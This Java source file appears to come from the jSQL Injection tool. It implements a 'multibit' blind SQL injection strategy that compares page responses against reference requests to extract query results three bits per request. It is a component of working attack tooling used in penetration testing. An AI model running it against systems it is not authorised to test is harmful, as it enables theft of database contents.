package com.jsql.model.injection.strategy.blind;

import com.jsql.model.InjectionModel;
import com.jsql.model.exception.StoppedByUserSlidingException;
import com.jsql.model.injection.strategy.blind.patch.Diff;
import com.jsql.util.LogLevelUtil;
import org.apache.commons.lang3.StringUtils;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.util.ArrayList;
import java.util.Collection;
import java.util.List;
import java.util.concurrent.CompletionService;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Future;
import java.util.concurrent.atomic.AtomicInteger;

public class InjectionMultibit extends AbstractInjectionBinary<CallableMultibit> {

    /**
     * Log4j logger sent to view.
     */
    private static final Logger LOGGER = LogManager.getRootLogger();

    private String sourceReference;

    private List<Diff> diffsCommonWithAllIds = new ArrayList<>();
    private final List<List<Diff>> diffsById = new ArrayList<>();

    public InjectionMultibit(InjectionModel injectionModel, BinaryMode blindMode) {
        super(injectionModel, blindMode);
        
        if (this.injectionModel.isStoppedByUser()) {
            return;
        }

        this.sourceReference = this.callUrl("8", "multi#ref");
        ExecutorService taskExecutor = this.injectionModel.getMediatorUtils().getThreadUtil().getExecutor("CallableGetMultibitIds");
        Collection<CallableMultibit> callablesId = new ArrayList<>();

        for (int i = 0; i < 8 ; i++) {
            callablesId.add(
                new CallableMultibit(
                    String.valueOf(i),
                    this,
                    "multi#ref~" + i
                )
            );
        }

        try {
            List<Future<CallableMultibit>> futuresId = taskExecutor.invokeAll(callablesId);
            this.injectionModel.getMediatorUtils().getThreadUtil().shutdown(taskExecutor);

            for (Future<CallableMultibit> futureId: futuresId) {
                List<Diff> diffsWithReference = futureId.get().getDiffsWithReference();
                if (this.diffsCommonWithAllIds.isEmpty()) {
                    this.diffsCommonWithAllIds = new ArrayList<>(diffsWithReference);
                } else {
                    this.diffsCommonWithAllIds.retainAll(diffsWithReference);
                }
                this.diffsById.add(diffsWithReference);
            }

            for (List<Diff> diffById : this.diffsById) {
                diffById.removeAll(this.diffsCommonWithAllIds);
            }
        } catch (ExecutionException e) {
            LOGGER.log(LogLevelUtil.CONSOLE_JAVA, e, e);
        } catch (InterruptedException e) {
            LOGGER.log(LogLevelUtil.IGNORE, e, e);
            Thread.currentThread().interrupt();
        }
    }

    public CallableMultibit getCallableTest(String sqlQuery, int indexCharacter, int block) {
        return new CallableMultibit(
            sqlQuery,
            indexCharacter,
            block,
            this.injectionModel,
            this,
            "multi#" + indexCharacter + "." + block
        );
    }

    @Override
    public boolean isInjectable() throws StoppedByUserSlidingException {
        if (this.injectionModel.isStoppedByUser()) {
            throw new StoppedByUserSlidingException();
        }
        var callableBlock1 = new CallableMultibit("'a'", 1, 1, this.injectionModel, this, "multi#confirm.1");
        var callableBlock2 = new CallableMultibit("'a'", 1, 2, this.injectionModel, this, "multi#confirm.2");
        var callableBlock3 = new CallableMultibit("'a'", 1, 3, this.injectionModel, this, "multi#confirm.3");
        callableBlock1.call();
        callableBlock2.call();
        callableBlock3.call();
        return callableBlock1.getIdPage() == 3 && callableBlock2.getIdPage() == 0 && callableBlock3.getIdPage() == 1;
    }

    @Override
    public String getInfoMessage() {
        return "- Strategy Multibit: query 3 bits when Diffs match index in " + this.diffsById + "\n\n";
    }

    @Override
    public void initNextChars(
        String sqlQuery,
        List<char[]> bytes,
        AtomicInteger indexCharacter,
        CompletionService<CallableMultibit> taskCompletionService,
        AtomicInteger countTasksSubmitted
    ) {
        indexCharacter.incrementAndGet();
        bytes.add(new char[]{ '0', 'x', 'x', 'x', 'x', 'x', 'x', 'x' });
        for (int block: new int[]{ 1, 2, 3 }) {
            taskCompletionService.submit(
                this.getCallableTest(
                    sqlQuery,
                    indexCharacter.get(),
                    block
                )
            );
            countTasksSubmitted.addAndGet(1);
        }
    }

    @Override
    public char[] initBinaryMask(List<char[]> bytes, CallableMultibit currentCallable) {
        // Bits for current url
        char[] asciiCodeMask = bytes.get(currentCallable.getCurrentIndex() - 1);
        this.extractBitsFromBlock(currentCallable, asciiCodeMask);
        return asciiCodeMask;
    }

    /**
     * Extract 3 bits from callable for specific block
     */
    private void extractBitsFromBlock(CallableMultibit currentCallable, char[] bits) {
        if (currentCallable.block == 1) {
            this.convertIdPageToBits(currentCallable.idPage, bits, 0, 1, 2);
        } else if (currentCallable.block == 2) {
            this.convertIdPageToBits(currentCallable.idPage, bits, 3, 4, 5);
        } else if (currentCallable.block == 3) {
            this.convertIdPageToBits(currentCallable.idPage, bits, -1, 6,7);
        }
    }

    /**
     * Set bits by page id
     */
    private void convertIdPageToBits(int idPage, char[] bits, int i1, int i2, int i3) {
        String idPageBinary = Integer.toBinaryString(idPage);
        String idPageBinaryPadded = StringUtils.leftPad(idPageBinary, 3, "0");

        if (i1 > -1) {
            bits[i1] = idPageBinaryPadded.charAt(0);
        }
        bits[i2] = idPageBinaryPadded.charAt(1);
        bits[i3] = idPageBinaryPadded.charAt(2);
    }


    // Getter

    public String getSourceReference() {
        return this.sourceReference;
    }

    public List<Diff> getDiffsCommonWithAllIds() {
        return this.diffsCommonWithAllIds;
    }

    public List<List<Diff>> getDiffsById() {
        return this.diffsById;
    }
}
